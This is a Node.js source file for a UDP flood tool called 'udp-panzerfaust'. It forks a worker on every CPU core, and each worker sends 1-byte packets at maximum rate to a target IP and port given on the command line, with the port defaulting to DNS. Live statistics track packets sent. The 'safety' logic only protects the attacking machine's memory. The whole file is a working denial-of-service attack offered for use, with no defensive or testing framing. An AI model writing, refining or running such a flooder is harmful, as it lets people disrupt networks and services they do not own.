const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node udp-panzerfaust.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const payload = Buffer.alloc(1); // 1-byte = max PPS
const cpuCount = os.cpus().length;

const SAFE_CPU_THRESHOLD = 90; // %
const SAFE_MEM_THRESHOLD = 85; // %

if (cluster.isMaster) {
  let totalSent = 0;
  let maxPPS = 0;

  console.clear();
  console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
  console.log('--------------------------------------');
  console.log(`Target: ${target}:${port}`);
  console.log(`Duration: ${duration}s`);
  console.log(`Cores: ${cpuCount}`);
  console.log('Launching...\n');

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        if (msg.pps > maxPPS) maxPPS = msg.pps;
      }
    });
  }

  setInterval(() => {
    console.clear();
    console.log('UDP-PANZERFAUST [PPS FOCUSED + SAFETY]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent: ${totalSent}`);
    console.log(`Max PPS: ${maxPPS}`);
    console.log(`Target: ${target}:${port}`);
    console.log('--------------------------------------');
    maxPPS = 0;
  }, 2000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  const sock = dgram.createSocket('udp4');
  let sent = 0;
  let pps = 0;
  let isThrottled = false;

  function systemSafe() {
    const mem = process.memoryUsage();
    const usedMB = mem.rss / 1024 / 1024;
    const totalMB = os.totalmem() / 1024 / 1024;
    const usagePercent = (usedMB / totalMB) * 100;
    return usagePercent < SAFE_MEM_THRESHOLD;
  }

  function spam() {
    function sendLoop() {
      if (Date.now() > endTime) return;

      if (!isThrottled && systemSafe()) {
        for (let i = 0; i < 1000; i++) {
          sock.send(payload, 0, payload.length, port, target, () => {
            sent++;
            pps++;
          });
        }
        setImmediate(sendLoop);
      } else {
        if (!isThrottled) {
          isThrottled = true;
          setTimeout(() => {
            isThrottled = false;
          }, 10000); // throttle for 10s
        }
        setTimeout(sendLoop, 100); // slowdown
      }
    }

    sendLoop();
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, pps });
    sent = 0;
    pps = 0;
  }, 1000);

  spam();
}
